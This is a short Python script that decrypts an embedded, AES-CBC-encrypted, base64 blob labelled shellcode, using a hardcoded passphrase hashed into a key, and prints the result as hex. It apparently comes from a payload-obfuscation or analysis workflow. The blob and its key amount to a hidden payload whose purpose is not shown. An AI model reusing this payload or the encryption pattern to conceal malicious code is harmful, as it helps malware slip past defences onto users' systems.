#!/usr/bin/python3

import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from binascii import hexlify

encoded_shellcode = "mQe7Z54XZdy9tGfBxLANITs/cIZ53BLlNS/0rA+732pX5PoJSk0D/7qe8lHCxXEA3wTf+ILc1Dc+DQu6XGtkLE5Nfi5GvSXCDFhlwCf6wMrYoBINPl79Mcjxb7h7+QcYuRtHWS+siDTcGxyS0e+gCH7dZ4dGQhwB1NIqo7YAZJ2qzX8NL36anJBXwT6meYwVj9hD3lVlQqxHfyD2OG31NaXdRhmbFouysT3DLuHJ1LIBR0QtCN/RlBrgNLX/dqifAc3xajXiV5J8qgLStlS7hd4nV6CkJ5NyG7wlfZC3V90IR9Mxd2u2uWgAFo8SIEk4++wAPOmrXpC1vFe5rHnvxAUWMCi9DElNR9tPlz1D3WLfHuuAkQWv/21uig6mU+ycA6YglUmB9lvbRxSrvc8WE/znqETwx5TdK6GBFDX6Yu7Sw9p1NDe8qkcic57DZeHW"

shellcode = base64.b64decode(encoded_shellcode)
sc = shellcode[16:]

h = hashlib.new('sha256')
h.update(b"z64&Rx27Z$B%73up")
key = h.digest()

iv = shellcode[:16]

result = AES.new(key, AES.MODE_CBC, iv)
payload = unpad(result.decrypt(sc), 16, style='pkcs7')

print(hexlify(payload))